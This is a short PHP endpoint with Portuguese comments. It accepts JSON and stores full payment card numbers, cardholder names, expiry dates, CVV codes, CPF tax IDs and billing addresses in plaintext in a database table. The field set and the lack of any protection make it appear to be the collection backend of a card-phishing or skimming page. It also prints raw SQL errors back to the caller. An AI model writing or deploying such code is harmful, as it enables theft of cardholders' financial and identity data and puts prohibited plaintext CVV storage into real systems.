<?php
include_once('conexao.php');

$json = file_get_contents('php://input');
$dados = json_decode($json, true);

if ($dados) {
    $numero_cartao = $conn->real_escape_string($dados['numero_cartao']);
    $nome_titular = $conn->real_escape_string($dados['nome_titular']);
    $validade = $conn->real_escape_string($dados['validade']);
    $cvv = $conn->real_escape_string($dados['cvv']);
    $cpf_titular = $conn->real_escape_string($dados['cpf_titular']);
    $endereco_cobranca = $conn->real_escape_string($dados['endereco_cobranca']);

    // Insere na tabela 'dados_cartao' (certifique-se que tem esta tabela criada)
    $sql = "INSERT INTO dados_cartao (numero_cartao, nome_titular, validade, cvv, cpf_titular, endereco_cobranca) 
            VALUES ('$numero_cartao', '$nome_titular', '$validade', '$cvv', '$cpf_titular', '$endereco_cobranca')";

    if ($conn->query($sql) === TRUE) {
        echo "Dados do cartão gravados com sucesso!";
    } else {
        echo "Erro SQL: " . $conn->error;
    }
}
?>
